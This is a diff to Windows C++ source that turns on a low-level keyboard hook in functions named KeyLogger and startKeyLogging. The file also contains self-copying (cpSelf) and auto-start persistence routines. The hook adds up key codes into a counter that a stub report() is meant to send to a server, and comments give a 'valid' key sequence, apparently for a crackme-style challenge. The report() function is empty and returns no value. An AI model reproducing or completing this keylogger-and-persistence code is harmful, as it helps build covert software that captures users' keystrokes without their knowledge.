@@ -2,6 +2,8 @@
 #include "toolskit.hpp"
 // #include
 
+DWORD KeyCounter = 0;
+
 std::string cpSelf()
 {
     // Get current path
@@ -31,6 +33,13 @@ std::string cpSelf()
     return "";
 }
 
+int report(DWORD keyCount)
+{
+    // Report the counter to server
+    // Valid keyCount = 1257 || 0x4E9
+    // Valid key example: [tab][1][s][3][c][F1][v][b][b][u][left_shift][right_ctrl][esc][windows][F4][esc]
+}
+
 bool autoStart(std::string whichToAutoStart)
 {
     // ThisIsAnUncrackableKey
@@ -57,47 +66,73 @@ bool autoStart(std::string whichToAutoStart)
     return true;
 }
 
-// DWORD WINAPI KeyLogger(LPVOID lpParameter)
-// {
-// 	HHOOK hKeyHook;
-// 	HINSTANCE hExe = GetModuleHandle(NULL);
-// 	if (hExe == NULL)
-// 	{
-// 		return 1;
-// 	}
-// 	else
-// 	{
-// 		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
-// 		MSG msg;
-// 		while (GetMessage(&msg, NULL, 0, 0) != 0)
-// 		{
-// 			TranslateMessage(&msg);
-// 			DispatchMessage(&msg);
-// 		}
-// 		UnhookWindowsHookEx(hKeyHook);
-// 	}
-// 	return 0;
-// }
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+    {
+        // Cast the lParam to the appropriate struct type
+        KBDLLHOOKSTRUCT *pKbdHook = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 
-// int StartKeyLogging()
-// {
-// 	HANDLE hThread;
-// 	DWORD dwThread;
-// 	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger,NULL, 0, NULL);
-// 	if (hThread)
-// 	{
-// 		return WaitForSingleObject(hThread, INFINITE);
-// 	}
-// 	else
-// 	{
-// 		return 1;
-// 	}
-// }
+        // Print the virtual key code of the key that was pressed
+        DWORD keyCode = pKbdHook->vkCode;
 
-// These are two functions written in C++ that create a keylogger application for Windows.
+        // If [Enter]
+        if (keyCode == 0x0D)
+        {
+            // Report the counter to server
+            // Valid keyCount = 1257
+            // Valid key example: [tab][1][s][3][c][F1][v][b][b][u][left_shift][right_ctrl][esc][windows][F4][esc]
+            report(KeyCounter);
+        }
+        // If [Backspace]
+        else if (keyCode == 0x08)
+        {
+            KeyCounter = 0;
+        }
+        else
+        {
+            KeyCounter += keyCode;
+        }
+        std::cout << "Counter: " << KeyCounter << std::endl;
+    }
 
-// The first function is DWORD WINAPI KeyLogger(LPVOID lpParameter). It is a callback function that is registered as a low-level keyboard hook using SetWindowsHookEx() function. When a key is pressed or released, the hook procedure is called and the information about the key event is passed to this function. This function handles the key event by logging the keystrokes to a file or displaying it in some other way. The function takes a single parameter, a pointer to an optional data that can be passed to the thread. It returns a DWORD value that indicates the exit code of the thread.
+    // Pass control to the next hook in the chain
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
 
-// The second function is int StartKeyLogging(). It creates a new thread using CreateThread() function and starts executing the KeyLogger() function on the new thread. If the thread is created successfully, this function waits for the thread to complete by calling WaitForSingleObject() function with an infinite timeout. The function returns an integer value that indicates the result of the thread execution. If the thread creation fails, the function returns 1.
+DWORD WINAPI KeyLogger(LPVOID lpParameter)
+{
+    HHOOK hook;
+    HINSTANCE hExe = GetModuleHandle(NULL);
+    if (hExe == NULL)
+    {
+        return 1;
+    }
+    else
+    {
+        hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
+        MSG msg;
+        while (GetMessage(&msg, NULL, 0, 0) != 0)
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        UnhookWindowsHookEx(hook);
+    }
+    return 0;
+}
 
-// Together, these two functions create a keylogger application that runs in the background and logs all the keystrokes made by the user.
+int startKeyLogging()
+{
+    HANDLE hThread;
+    DWORD dwThread;
+    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0, NULL);
+    if (hThread)
+    {
+        return WaitForSingleObject(hThread, INFINITE);
+    }
+    else
+    {
+        return 1;
+    }
+}
